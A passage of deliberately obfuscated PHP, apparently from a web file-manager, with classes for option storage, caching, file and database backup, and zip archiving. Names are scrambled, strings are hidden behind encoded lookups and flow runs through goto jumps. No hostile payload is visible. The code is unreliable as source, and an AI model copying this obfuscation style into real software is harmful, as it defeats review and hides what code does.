(!isset($¡Ù˜ÜŸ—[$¦¤Ô­«Ö[229]]) && isset($¡Ù˜ÜŸ—[$¦¤Ô­«Ö[244]])) { $¡Ù˜ÜŸ—[$¦¤Ô­«Ö[229]] = $¡Ù˜ÜŸ—[$¦¤Ô­«Ö[244]]; } } catch (Exception $×èğÎÕÜ) { $¡Ù˜ÜŸ— = !1; } if (!$¡Ù˜ÜŸ—) { } return $¡Ù˜ÜŸ—; } protected function _isFolder($Ê˜‡ÔÑå) { $İ¡ŠîÊ =& $_SERVER[Á÷ ­Šë]; $Ê˜‡ÔÑå = rtrim($Ê˜‡ÔÑå, $İ¡ŠîÊ[8]); if ($Ê˜‡ÔÑå == $İ¡ŠîÊ[33] || $Ê˜‡ÔÑå == $İ¡ŠîÊ[8]) { return !0; } $—¤«³ÛÈ = $this->client->getBucket($this->bucket, $Ê˜‡ÔÑå, null, 1); if (empty($—¤«³ÛÈ[$İ¡ŠîÊ[208]])) { return !1; } $äğŒ¦ø® = $—¤«³ÛÈ[$İ¡ŠîÊ[208]][0][$İ¡ŠîÊ[28]]; return stripos($äğŒ¦ø®, $Ê˜‡ÔÑå . $İ¡ŠîÊ[8]) === 0 ? !0 : !1; if (substr($äğŒ¦ø®, -1) == $İ¡ŠîÊ[8]) { return !0; } if (get_path_this($äğŒ¦ø®) == get_path_this($Ê˜‡ÔÑå)) { return !1; } return !0; } } goto bŒˆ¬Ò™Â; c®„æ¾¶ÒŠ: class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\164\x65\x6d\x4f\x70\x74\151\x6f\156"; public $field = array(); public function listData($…úÈÃîÃ = false, $“İá¹·¯ = "\x6d\x6f\x64\x69\x66\171\x54\151\x6d\x65", $™ó“ù·ß = false) { $¡—áŸ·§ = Model($this->modelType)->get(!1, $this->optionType, !0); $±Ğ±ÛŒû = array_values($¡—áŸ·§); if ($±Ğ±ÛŒû && $±Ğ±ÛŒû[0] && !is_array($±Ğ±ÛŒû[0])) { Model($this->modelType)->cacheRemove($this->optionType); $¡—áŸ·§ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$¡—áŸ·§) { return $…úÈÃîÃ ? null : array(); } if (!$…úÈÃîÃ) { $¡—áŸ·§ = array_filter(array_values($¡—áŸ·§)); return array_sort_by($¡—áŸ·§, $“İá¹·¯, $™ó“ù·ß); } return $¡—áŸ·§[$_SERVER[Á÷ ­Šë][401] . $…úÈÃîÃ]; } public function insert($‚²İ¦Šù) { $éÚÂ¿à =& $_SERVER[Á÷ ­Šë]; $‚²İ¦Šù = array_field_key($‚²İ¦Šù, $this->field); $Š®¹š¼ = Model($this->modelType)->get($éÚÂ¿à[402], $this->optionType . $éÚÂ¿à[403]); $Š®¹š¼ = $Š®¹š¼ ? $Š®¹š¼ : 0; $‚²İ¦Šù[$éÚÂ¿à[404]] = ++$Š®¹š¼; $‚²İ¦Šù[$éÚÂ¿à[204]] = time(); $‚²İ¦Šù[$éÚÂ¿à[94]] = time(); Model($this->modelType)->set($éÚÂ¿à[402], $Š®¹š¼, $this->optionType . $éÚÂ¿à[403]); Model($this->modelType)->set($éÚÂ¿à[401] . $Š®¹š¼, $‚²İ¦Šù, $this->optionType); return $Š®¹š¼; } public function update($ø™ÒÓİ‚, $ñşŠ±Åş) { $á×¦½æ§ =& $_SERVER[Á÷ ­Šë]; $ñşŠ±Åş = array_field_key($ñşŠ±Åş, $this->field); $Úüûá¨ = $this->listData($ø™ÒÓİ‚); if (!$Úüûá¨ || !$ø™ÒÓİ‚) { return !1; } $ñşŠ±Åş = array_merge($Úüûá¨, $ñşŠ±Åş); $ñşŠ±Åş[$á×¦½æ§[94]] = time(); return Model($this->modelType)->set($á×¦½æ§[401] . $ø™ÒÓİ‚, $ñşŠ±Åş, $this->optionType); } public function remove($¨ÌãøÀ‡) { if (!$¨ÌãøÀ‡) { return !1; } return Model($this->modelType)->remove($_SERVER[Á÷ ­Šë][401] . $¨ÌãøÀ‡, $this->optionType); } public function clear() { $ø¥ôëŞ™ =& $_SERVER[Á÷ ­Šë]; Model($this->modelType)->remove($ø¥ôëŞ™[402], $this->optionType . $ø¥ôëŞ™[403]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Üò™çÏË, $™ëı‡“á) { if (!$™ëı‡“á) { return !1; } $Ğá¿„áö = $this->listData(); $Ğá¿„áö = array_to_keyvalue($Ğá¿„áö, $Üò™çÏË); return isset($Ğá¿„áö[$™ëı‡“á]) ? $Ğá¿„áö[$™ëı‡“á] : !1; } public function findByName($øË½áıÑ) { return $this->findByKey($_SERVER[Á÷ ­Šë][28], $øË½áıÑ); } protected function resetData($±ÛÍÖÎ) { $ÙúÈıÎ¶ =& $_SERVER[Á÷ ­Šë]; $±ÛÍÖÎ = is_array($±ÛÍÖÎ) ? $±ÛÍÖÎ : array(); $Ñ”šï‰¸ = array(); for ($º×è’© = 0; $º×è’© < count($±ÛÍÖÎ); $º×è’©++) { $Ñ”šï‰¸[$ÙúÈıÎ¶[401] . $±ÛÍÖÎ[$º×è’©][$ÙúÈıÎ¶[404]]] = $±ÛÍÖÎ[$º×è’©]; } return Model($this->modelType)->set($Ñ”šï‰¸, !1, $this->optionType); } private function getAutoName($ªÛÍó–) { $Âê¼ßğ” = array_to_keyvalue($this->listData(), $_SERVER[Á÷ ­Šë][28]); if (!$Âê¼ßğ” || !isset($Âê¼ßğ”[$ªÛÍó–])) { return $ªÛÍó–; } for ($İ¢îß®Ç = 1; $İ¢îß®Ç < count($Âê¼ßğ”); $İ¢îß®Ç++) { $¼Ì¤€• = $ªÛÍó– . "\50{$İ¢îß®Ç}\x29"; if (!isset($Âê¼ßğ”[$¼Ì¤€•])) { return $¼Ì¤€•; } } return $¼Ì¤€•; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($ßÕôîÎ² = false, $€¤‹” = '', $ùñ÷Êõ¿ = false) { $‚Ì‰×ñÇ =& $_SERVER[Á÷ ­Šë]; $°ï‹Ô—Ğ = $this->cacheGet($€¤‹”); $‘ä¾¡îï = $this->optionDefault($€¤‹”); $‘ä¾¡îï = is_array($‘ä¾¡îï) ? $‘ä¾¡îï : array(); if (is_array($°ï‹Ô—Ğ)) { $°ï‹Ô—Ğ = array_merge($‘ä¾¡îï, $°ï‹Ô—Ğ); return $ßÕôîÎ² ? isset($°ï‹Ô—Ğ[$ßÕôîÎ²]) ? $°ï‹Ô—Ğ[$ßÕôîÎ²] : null : $°ï‹Ô—Ğ; } $¾ĞŞÕñµ = $this->filterWhere(array($‚Ì‰×ñÇ[29] => $€¤‹”)); $°ï‹Ô—Ğ = $this->where($¾ĞŞÕñµ)->select(); $°ï‹Ô—Ğ = array_to_keyvalue($°ï‹Ô—Ğ, $‚Ì‰×ñÇ[103], $‚Ì‰×ñÇ[381]); foreach ($°ï‹Ô—Ğ as $‰’ïûæã => $Æ ò«ª) { if ($ùñ÷Êõ¿ || in_array($‰’ïûæã, $this->jsonField)) { $°ï‹Ô—Ğ[$‰’ïûæã] = json_decode($Æ ò«ª, !0); } } $this->cacheSet($€¤‹”, $°ï‹Ô—Ğ); $°ï‹Ô—Ğ = array_merge($‘ä¾¡îï, $°ï‹Ô—Ğ); return $ßÕôîÎ² ? $°ï‹Ô—Ğ[$ßÕôîÎ²] : $°ï‹Ô—Ğ; } public function set($±êæ¯öË, $óÎ¯‹Û¾ = false, $ıÒßîÇ = '') { $éóŸ² =& $_SERVER[Á÷ ­Šë]; $this->cacheRemove($ıÒßîÇ); $¹ÁÎµ„ = array(); $Üû“€„¨ = is_array($±êæ¯öË) ? $±êæ¯öË : array($±êæ¯öË => $óÎ¯‹Û¾); foreach ($Üû“€„¨ as $ÃÇ«Ö®„ => $ÅªâĞ‘ˆ) { if (is_array($ÅªâĞ‘ˆ)) { $ÅªâĞ‘ˆ = json_encode_force($ÅªâĞ‘ˆ); } $this->checkLength($ÅªâĞ‘ˆ, !1, $this->tableName . $éóŸ²[4] . $±êæ¯öË); $ÅªâĞ‘ˆ = self::textEncode($ÅªâĞ‘ˆ); $Üû“€„¨ = array($éóŸ²[29] => $ıÒßîÇ, $éóŸ²[103] => $ÃÇ«Ö®„, $éóŸ²[381] => $ÅªâĞ‘ˆ); $¹ÁÎµ„[] = $this->filterWhere($Üû“€„¨); } if (!$¹ÁÎµ„) { return !0; } return $this->addAll($¹ÁÎµ„, array(), !0); } protected function optionDefault($£‹ŒÌË» = '') { return !1; } public function setDeep($£·‘Ğ, $ ŞÛ–³Ç = false, $›½ì™©“ = '') { $”®ªĞ = explode($_SERVER[Á÷ ­Šë][105], $£·‘Ğ); $Òû³ığß = $this->get(); array_set_value($Òû³ığß, $£·‘Ğ, $ ŞÛ–³Ç); $this->set($”®ªĞ[0], $Òû³ığß[$”®ªĞ[0]], $›½ì™©“); } public function remove($éÉô¤§ƒ, $”£®ÀÁş = '') { $«­¾Ëş =& $_SERVER[Á÷ ­Šë]; $this->cacheRemove($”£®ÀÁş); $ÆÊ±ˆş´ = $this->filterWhere(array($«­¾Ëş[103] => $éÉô¤§ƒ, $«­¾Ëş[29] => $”£®ÀÁş)); if (is_null($éÉô¤§ƒ)) { unset($ÆÊ±ˆş´[$«­¾Ëş[103]]); } return $this->where($ÆÊ±ˆş´)->delete(); } public function cacheSet($ÅÙÕ¼Ğ, $¥Îû‘°Æ = false) { return Cache::set($this->cacheKey($ÅÙÕ¼Ğ), $¥Îû‘°Æ); } public function cacheGet($İˆÔÍÁ¤) { return Cache::get($this->cacheKey($İˆÔÍÁ¤)); } public function cacheRemove($ëÂ›ë£Ñ) { return Cache::remove($this->cacheKey($ëÂ›ë£Ñ)); } protected function filterWhere($ö¶¿™‡Î) { return $ö¶¿™‡Î; } protected function cacheKey($á«‹„‡) { return $á«‹„‡; } } $_file = $_SERVER[$_SERVER[Á÷ ­Šë][66]]; goto A‚£ˆøî´“; bãê…ÎÓ»©: class BackupDbFile { public function __construct() { } public function index() { $£Õë öç =& $_SERVER[Á÷ ­Šë]; $ëãöóß° = Backup::get(); $£¥”¶ş = $ëãöóß°[$£Õë öç[28]]; $Éùö’äã = $this->tmpFilesPath() . "\142\x61\143\x6b\165\x70\x5f{$£¥”¶ş}\57"; $¢–ÌÆÛ = $this->backupPath($ëãöóß°); if (!($¢–ÌÆÛ = IO::mkdir($¢–ÌÆÛ))) { return !1; } $ì»ìÀÀ® = IO::listPath($Éùö’äã); $á‰£ˆ½µ = isset($ì»ìÀÀ®[$£Õë öç[84]]) ? $ì»ìÀÀ®[$£Õë öç[84]] : array(); $ ¡Ù­å = array_sum(array_column($á‰£ˆ½µ, $£Õë öç[88])); if (!$ ¡Ù­å) { return !1; } $ÒÚéö = array($£Õë öç[799] => $ ¡Ù­å, $£Õë öç[800] => time()); Backup::set($ÒÚéö); $‘µ±¬ùµ = new TaskFileTransfer($£Õë öç[801], $£Õë öç[777], count($á‰£ˆ½µ), LNG($£Õë öç[778]) . $£Õë öç[464] . LNG($£Õë öç[780]) . $£Õë öç[802]); $‘µ±¬ùµ->task[$£Õë öç[758]] = $ ¡Ù­å; foreach ($ì»ìÀÀ®[$£Õë öç[84]] as $«–ó¾×ğ) { $­ğşœ¶ï = IO::move($«–ó¾×ğ[$£Õë öç[86]], $¢–ÌÆÛ); if (!$­ğşœ¶ï) { $‘µ±¬ùµ->end(); $Â©³®èñ = IO::getLastError($£Õë öç[803] . $«–ó¾×ğ[$£Õë öç[86]] . $£Õë öç[804] . $¢–ÌÆÛ . $£Õë öç[540]); write_log($Â©³®èñ, $£Õë öç[777]); return !1; } } $ƒäÄêÂ° = CONTROLLER_DIR . $£Õë öç[805]; $ğã©°•ï = CONTROLLER_DIR . $£Õë öç[806]; IO::copy($ƒäÄêÂ°, $¢–ÌÆÛ); IO::copy($ğã©°•ï, $¢–ÌÆÛ); $‘µ±¬ùµ->end(); $ÒÚéö = array($£Õë öç[807] => $ ¡Ù­å, $£Õë öç[808] => time()); Backup::set($ÒÚéö); return !0; } private function backupPath($ş“¾€·Ï) { $„À×âûö =& $_SERVER[Á÷ ­Šë]; $í®ë££Ğ = $ş“¾€·Ï[$„À×âûö[28]]; $§úœÖ¬ó = Model($„À×âûö[765])->get($„À×âûö[766]); $–ÈîÇ›¹ = substr(md5($„À×âûö[767] . $§úœÖ¬ó . $í®ë££Ğ), 0, 8); return "\x7b\151\157\x3a{$ş“¾€·Ï[$„À×âûö[747]]}\175\x2f\144\141\164\x61\x62\x61\x73\x65\x2f\x62\141\143\x6b\x75\160\x2f" . $í®ë££Ğ . $„À×âûö[81] . $–ÈîÇ›¹; } private function tmpFilesPath() { $„¼Í”†Ç =& $_SERVER[Á÷ ­Šë]; $‰ıÏÌ‰à = TEMP_FILES; if ($GLOBALS[$„¼Í”†Ç[6]][$„¼Í”†Ç[98]][$„¼Í”†Ç[797]]) { $‰ıÏÌ‰à = $GLOBALS[$„¼Í”†Ç[6]][$„¼Í”†Ç[98]][$„¼Í”†Ç[797]]; if (!mk_dir($‰ıÏÌ‰à) || !is_writable($‰ıÏÌ‰à) || !IO::mkfile($‰ıÏÌ‰à . $„¼Í”†Ç[798])) { $‰ıÏÌ‰à = TEMP_FILES; } } return $‰ıÏÌ‰à; } } class BackupFile { public function __construct() { } public function index() { $’ú¸–Î© = Backup::get(); $²óà½ = $’ú¸–Î©[$_SERVER[Á÷ ­Šë][300]][$_SERVER[Á÷ ­Šë][203]][$_SERVER[Á÷ ­Šë][471]]; $°œ²–»¬ = array($_SERVER[Á÷ ­Šë][472] => array($_SERVER[Á÷ ­Šë][809], $²óà½), $_SERVER[Á÷ ­Šë][810] => array($_SERVER[Á÷ ­Šë][338], $’ú¸–Î©[$_SERVER[Á÷ ­Šë][747]])); $€Æ‡¾É = (int) Model($_SERVER[Á÷ ­Šë][782])->where($°œ²–»¬)->count($_SERVER[Á÷ ­Šë][471]); $¦ÍœèîŠ = (int) Model($_SERVER[Á÷ ­Šë][782])->where($°œ²–»¬)->sum($_SERVER[Á÷ ­Šë][88]); $Ìû£µè» = new TaskFileTransfer($_SERVER[Á÷ ­Šë][811], $_SERVER[Á÷ ­Šë][777], $€Æ‡¾É, LNG($_SERVER[Á÷ ­Šë][778]) . $_SERVER[Á÷ ­Šë][779] . LNG($_SERVER[Á÷ ­Šë][812])); $Ìû£µè»->task[$_SERVER[Á÷ ­Šë][758]] = $¦ÍœèîŠ; $¦Áğƒ¿î = array($_SERVER[Á÷ ­Šë][813] => $€Æ‡¾É, $_SERVER[Á÷ ­Šë][814] => $¦ÍœèîŠ, $_SERVER[Á÷ ­Šë][815] => time()); Backup::set($¦Áğƒ¿î); $±üöŠİ = !0; $Àõ¶é„ = $this->storeIds(); $ãÈŒßã… = 1; $œ¼À’‹‰ = 1000; $ê¸€›ä» = $İ—´º = 0; $ÂÕïÜÜ¬ = array(); $ÜÕî€Šš = $ã›•˜æ = 0; do { $•Ö¬¢ø« = $_SERVER[Á÷ ­Šë][816]; $Š¹…«»¯ = Model($_SERVER[Á÷ ­Šë][782])->where($°œ²–»¬)->field($•Ö¬¢ø«)->order($_SERVER[Á÷ ­Šë][817])->selectPage($œ¼À’‹‰, $ãÈŒßã…); $Ûİâßƒò = !empty($Š¹…«»¯[$_SERVER[Á÷ ­Šë][376]]) ? $Š¹…«»¯[$_SERVER[Á÷ ­Šë][376]] : array(); foreach ($Ûİâßƒò as $Ú³¦Ş‰ì) { if (!$this->_fileExist($Ú³¦Ş‰ì, $ÂÕïÜÜ¬, $Àõ¶é„)) { $€Æ‡¾É -= 1; $¦ÍœèîŠ -= (int) $Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][88]]; write_log("\x66\151\x6c\145\40\x6e\x6f\164\40\x65\x78\151\163\x74\56\x66\151\154\145\111\x44\72{$Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][471]]}\54\x20\x70\x61\x74\150\x3a{$Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][86]]}", $_SERVER[Á÷ ­Šë][818]); continue; } $ãä‰›ºÁ = $Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][86]]; $ªµµö—­ = "\173\x69\157\x3a{$’ú¸–Î©[$_SERVER[Á÷ ­Šë][747]]}\175" . substr($ãä‰›ºÁ, strlen("\x7b\151\157\x3a{$Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][819]]}\x7d")); if (IO::exist($ªµµö—­)) { $Ìû£µè»->updateFileEnd($Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][28]], $Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][88]]); } else { $ªµµö—­ = get_path_father($ªµµö—­); IO::mkdir($ªµµö—­); if (!IO::copy($ãä‰›ºÁ, $ªµµö—­, $_SERVER[Á÷ ­Šë][820])) { write_log($_SERVER[Á÷ ­Šë][821] . $ãä‰›ºÁ . $_SERVER[Á÷ ­Šë][804] . $ªµµö—­ . $_SERVER[Á÷ ­Šë][540], $_SERVER[Á÷ ­Šë][777]); $±üöŠİ = !1; break; } } $²óà½ = $Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][471]]; $İ—´º += 1; $ê¸€›ä» += $Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][88]]; $ã›•˜æ += 1; $ÜÕî€Šš += $Ú³¦Ş‰ì[$_SERVER[Á÷ ­Šë][88]]; if ($ê¸€›ä» >= 1024 * 1024 * 100) { $¦Áğƒ¿î = array($_SERVER[Á÷ ­Šë][822] => $²óà½, $_SERVER[Á÷ ­Šë][823] => $ã›•˜æ, $_SERVER[Á÷ ­Šë][824] => $ÜÕî€Šš); Backup::set($¦Áğƒ¿î); $ê¸€›ä» = $İ—´º = 0; } } $¢Ùš®¹Ä = count($Ûİâßƒò); $ãÈŒßã…++; } while ($¢Ùš®¹Ä == $œ¼À’‹‰); $Ìû£µè»->end(); $¦Áğƒ¿î = array($_SERVER[Á÷ ­Šë][825] => 1, $_SERVER[Á÷ ­Šë][500] => time(), $_SERVER[Á÷ ­Šë][770] => 1, $_SERVER[Á÷ ­Šë][822] => $²óà½, $_SERVER[Á÷ ­Šë][814] => $¦ÍœèîŠ, $_SERVER[Á÷ ­Šë][813] => $€Æ‡¾É, $_SERVER[Á÷ ­Šë][826] => time()); if ($İ—´º) { $¦Áğƒ¿î[$_SERVER[Á÷ ­Šë][823]] = $ã›•˜æ; $¦Áğƒ¿î[$_SERVER[Á÷ ­Šë][824]] = $ÜÕî€Šš; } Backup::set($¦Áğƒ¿î); $this->_fileFilter($ÂÕïÜÜ¬); return !0; } private function _fileExist($»‰Ò–¬„, &$ãÑøí“ï, $³Ç¶Œ) { $ü›šâà¹ =& $_SERVER[Á÷ ­Šë]; $ÀæÉâªÌ = $»‰Ò–¬„[$ü›šâà¹[86]]; if (in_array($»‰Ò–¬„[$ü›šâà¹[471]], $ãÑøí“ï)) { return !1; } if (!in_array($»‰Ò–¬„[$ü›šâà¹[819]], $³Ç¶Œ)) { return !1; } if (IO::exist($ÀæÉâªÌ)) { return !0; } $á”İÛÌı = get_path_father($ÀæÉâªÌ); if (IO::exist($á”İÛÌı)) { $ãÑøí“ï[] = $»‰Ò–¬„[$ü›šâà¹[471]]; return !1; } $ıù×ºÊ = array($ü›šâà¹[819] => $»‰Ò–¬„[$ü›šâà¹[819]], $ü›šâà¹[86] => array($ü›šâà¹[390], "{$á”İÛÌı}\45")); $ñõêÊ½‰ = Model($ü›šâà¹[782])->where($ıù×ºÊ)->field($ü›šâà¹[472])->select(); $ãÑøí“ï = array_merge($ãÑøí“ï, array_to_keyvalue($ñõêÊ½‰, $ü›šâà¹[33], $ü›šâà¹[471])); return !1; } private function _fileFilter($ÕÛ™äˆ) { $ö£¾‡â¡ =& $_SERVER[Á÷ ­Šë]; if (empty($ÕÛ™äˆ)) { return; } $İ¶‰Áİ¦ = array($ö£¾‡â¡[471] => array($ö£¾‡â¡[7], array_unique($ÕÛ™äˆ))); $ÄÍªœ½ˆ = Model($ö£¾‡â¡[827])->where($İ¶‰Áİ¦)->field($ö£¾‡â¡[407])->select(); foreach ($ÄÍªœ½ˆ as $·åæÄöØ) { Model($ö£¾‡â¡[827])->remove($·åæÄöØ[$ö£¾‡â¡[407]], !1); } } private function storeIds() { $ÍçıÄ±Õ =& $_SERVER[Á÷ ­Šë]; $Ğ·ìÖÊñ = Model($ÍçıÄ±Õ[762])->listData(); $á›•°É¼ = array(); $Ö‚¤çêû = $GLOBALS[$ÍçıÄ±Õ[6]][$ÍçıÄ±Õ[98]][$ÍçıÄ±Õ[828]]; foreach ($Ğ·ìÖÊñ as $ì³½·†û) { $Òâ¼Ú× = strtolower($ì³½·†û[$ÍçıÄ±Õ[104]]); if (!isset($Ö‚¤çêû[$Òâ¼Ú×])) { continue; } $ÙŸ°ìÙù = $ÍçıÄ±Õ[82] . (isset($Ö‚¤çêû[$Òâ¼Ú×]) ? $Ö‚¤çêû[$Òâ¼Ú×] : ucfirst($Òâ¼Ú×)); if (!class_exists($ÙŸ°ìÙù)) { continue; } $á›•°É¼[] = $ì³½·†û[$ÍçıÄ±Õ[404]]; } return $á›•°É¼; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ã´üã‘ =& $_SERVER[Á÷ ­Šë]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $’Ó¨¯«½ = $GLOBALS[$ã´üã‘[6]][$ã´üã‘[356]]; $‰é»¿İê = $’Ó¨¯«½[$’Ó¨¯«½[$ã´üã‘[829]]]; $Á™²Ñ©õ = $’Ó¨¯«½[$ã´üã‘[830]]; switch ($’Ó¨¯«½[$ã´üã‘[829]]) { case $ã´üã‘[17]: self::$handle = Model($ã´üã‘[831]); break; case $ã´üã‘[832]: self::$handle = new CacheRedis($‰é»¿İê, $Á™²Ñ©õ); break; case $ã´üã‘[833]: self::$handle = new CacheMemcached($‰é»¿İê, $Á™²Ñ©õ); break; case $ã´üã‘[203]: self::$handle = new CacheFile($‰é»¿İê, $Á™²Ñ©õ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ò¿»¹Ó²) { if (is_array($ò¿»¹Ó²) || is_object($ò¿»¹Ó²)) { $ò¿»¹Ó² = json_encode($ò¿»¹Ó²); } $ò¿»¹Ó² = rawurlencode($ò¿»¹Ó²); return md5(KOD_SITE_ID . $_SERVER[Á÷ ­Šë][81] . $ò¿»¹Ó²); } public static function get($ŒôşÓı, $’şÃ˜Ñ  = false) { $ä¹Öí¥Ã = self::key($ŒôşÓı); if ($’şÃ˜Ñ ) { return unserialize(self::init()->get($ä¹Öí¥Ã)); } if (!isset(self::$memoryCache[$ä¹Öí¥Ã])) { $ÌÂ¦çúı = self::init()->get($ä¹Öí¥Ã); self::$memoryCache[$ä¹Öí¥Ã] = unserialize($ÌÂ¦çúı); } return self::$memoryCache[$ä¹Öí¥Ã]; } public static function set($´Ëõ›Á½, $‡÷ÀÇ, $ÄêâÒ¨¢ = false) { $¶äâûŠù = self::key($´Ëõ›Á½); if (isset(self::$memoryCache[$¶äâûŠù]) && self::$memoryCache[$¶äâûŠù] === $‡÷ÀÇ) { return !0; } if ($ÄêâÒ¨¢ === 0) { self::$memoryCache[$¶äâûŠù] = $‡÷ÀÇ; return !0; } CacheLock::lock($´Ëõ›Á½); $ñ“ÚƒÀ¹ = self::init()->set($¶äâûŠù, serialize($‡÷ÀÇ), $ÄêâÒ¨¢); self::$memoryCache[$¶äâûŠù] = $‡÷ÀÇ; CacheLock::unlock($´Ëõ›Á½); return $ñ“ÚƒÀ¹; } public static function getCall($¶²—à“´, $¶´ååÖŒ, $™òå¦×ê, $é²ß­“ = array()) { $³—†ğ¸ =& $_SERVER[Á÷ ­Šë]; $©ØìåÂ¶ = self::get($¶²—à“´); if ($©ØìåÂ¶ || $©ØìåÂ¶ === $³—†ğ¸[33]) { return $©ØìåÂ¶; } $©ØìåÂ¶ = call_user_func_array($™òå¦×ê, $é²ß­“); $©ØìåÂ¶ = $©ØìåÂ¶ ? $©ØìåÂ¶ : $³—†ğ¸[33]; self::set($¶²—à“´, $©ØìåÂ¶, $¶´ååÖŒ); return $©ØìåÂ¶; } public static function remove($¸—§”¢û) { $‹½—ÀªÃ = self::key($¸—§”¢û); unset(self::$memoryCache[$‹½—ÀªÃ]); self::clearTimeout(); CacheLock::lock($¸—§”¢û); $ÎˆâÛ™ø = self::init()->remove($‹½—ÀªÃ); CacheLock::unlock($¸—§”¢û); return $ÎˆâÛ™ø; } public static function removeMemory($óÖö³ñ‘) { $…ƒ¤ËÁ = self::key($óÖö³ñ‘); unset(self::$memoryCache[$…ƒ¤ËÁ]); } public static function clearMemory($ã×û¡ö = false) { if ($ã×û¡ö) { $ã×û¡ö = self::key($ã×û¡ö); unset(self::$memoryCache[$ã×û¡ö]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Á÷ ­Šë][834])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Á÷ ­Šë][835])) { self::init()->clearTimeout(); } } } goto c•Ô›ëŠã¦; d‚•×Îå„: class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $“ƒ‰èŞ´; if (!$“ƒ‰èŞ´) { $¾µôÌÀì = IO::init($_SERVER[Á÷ ­Šë][8]); } return $¾µôÌÀì; } private static function iconvSystem($ğÈÃ¢€) { return self::local()->iconvSystem($ğÈÃ¢€); } private static function iconvApp($üá’÷ä) { return self::local()->iconvApp($üá’÷ä); } public static function zip($£Û¶…ı, $©•È§²® = "\172\x69\x70", $ ”²­ûÁ = '', $½“Ú•°î = REPEAT_RENAME) { $Û×ˆş’ =& $_SERVER[Á÷ ­Šë]; $ğìòêÇó = self::init($£Û¶…ı[0][$Û×ˆş’[86]]); $‚´¨â = self::info($£Û¶…ı[0][$Û×ˆş’[86]]); $á‡…Â• = !1; if (!$ ”²­ûÁ && $ğìòêÇó->getType() == $Û×ˆş’[116]) { $Å™üàùÙ = self::zipFileList($£Û¶…ı); } else { $á‡…Â• = $ ”²­ûÁ ? $ ”²­ûÁ : TEMP_FILES . $Û×ˆş’[1110] . time() . rand_string(8) . $Û×ˆş’[8]; mk_dir($á‡…Â•); $Å™üàùÙ = self::zipFileList($£Û¶…ı, $á‡…Â•); } $Àõ…‘òé = $‚´¨â[$Û×ˆş’[28]]; if (count($Å™üàùÙ) > 1) { $àû……û‰ = IO::info(IO::pathFather($‚´¨â[$Û×ˆş’[86]])); $Àõ…‘òé = $àû……û‰[$Û×ˆş’[28]]; } $Ëû·òŞù = $á‡…Â•; if (!$Ëû·òŞù) { $Ëû·òŞù = get_path_father($‚´¨â[$Û×ˆş’[86]]); if (!$ ”²­ûÁ && $ğìòêÇó->getType() == $Û×ˆş’[116]) { $Ëû·òŞù = get_path_father($ğìòêÇó->path); } $èÈ—™‘û = IO::info($Ëû·òŞù); if (!$èÈ—™‘û[$Û×ˆş’[206]]) { show_json(LNG($Û×ˆş’[1111]), !1); } } $œÕˆƒ¢¡ = $Ëû·òŞù . $Àõ…‘òé . $Û×ˆş’[105] . $©•È§²®; $œÕˆƒ¢¡ = get_filename_auto($œÕˆƒ¢¡, $Û×ˆş’[33], $½“Ú•°î); $£¤¶„İğ = self::iconvSystem($œÕˆƒ¢¡); foreach ($Å™üàùÙ as $œö¶Øß÷ => $¾¿¨ğŞ) { $Å™üàùÙ[$œö¶Øß÷] = self::iconvSystem($¾¿¨ğŞ); } KodArchive::create($£¤¶„İğ, $Å™üàùÙ); if (!IO::exist($œÕˆƒ¢¡)) { if ($á‡…Â•) { del_dir($á‡…Â•); } show_json(LNG($Û×ˆş’[1112]), !1); } if ($ ”²­ûÁ || !$á‡…Â•) { if ($á‡…Â• && strstr($á‡…Â•, TEMP_FILES)) { $¹ïê¼Ù = $Å™üàùÙ = array(); recursion_dir($Ëû·òŞù, $¹ïê¼Ù, $Å™üàùÙ, 0); foreach ($¹ïê¼Ù as $’¥ĞÈñ›) { del_dir($’¥ĞÈñ›); } foreach ($Å™üàùÙ as $ƒ•‹ÂŠÉ) { if ($ƒ•‹ÂŠÉ == $£¤¶„İğ) { continue; } del_file($ƒ•‹ÂŠÉ); } } return $œÕˆƒ¢¡; } $¢Œá = self::pathFather($‚´¨â[$Û×ˆş’[86]]); $×²Ÿì¤‚ = self::move($œÕˆƒ¢¡, $¢Œá, $½“Ú•°î); if (!$×²Ÿì¤‚) { del_dir($á‡…Â•); show_json(LNG($Û×ˆş’[1112]), !1); } del_dir($á‡…Â•); return $×²Ÿì¤‚; } public static function unzip($•ÖŒĞ§´, $Âõˆô¾© = "\x72\x65\160\154\x61\x63\x65") { $ñÀŞĞœï =& $_SERVER[Á÷ ­Šë]; $àÔ§ªÄÉ = $•ÖŒĞ§´[$ñÀŞĞœï[86]]; $ëãõšãá = $•ÖŒĞ§´[$ñÀŞĞœï[1113]]; if (!($ºşıù¸Î = parent::info($àÔ§ªÄÉ))) { show_json(LNG($ñÀŞĞœï[1114]), !1); } if (!($èâ®Ú¿ı = parent::infoFull($ëãõšãá))) { $ëãõšãá = parent::mkdir($ëãõšãá); $èâ®Ú¿ı = array($ñÀŞĞœï[86] => $ëãõšãá); } else { if (isset($èâ®Ú¿ı[$ñÀŞĞœï[407]]) && trim($èâ®Ú¿ı[$ñÀŞĞœï[86]], $ñÀŞĞœï[8]) != trim($ëãõšãá, $ñÀŞĞœï[8])) { $Ÿ¶­œùå = KodIO::make($èâ®Ú¿ı[$ñÀŞĞœï[502]]); $Œ£Ø½‹× = parent::fileNameAuto($Ÿ¶­œùå, 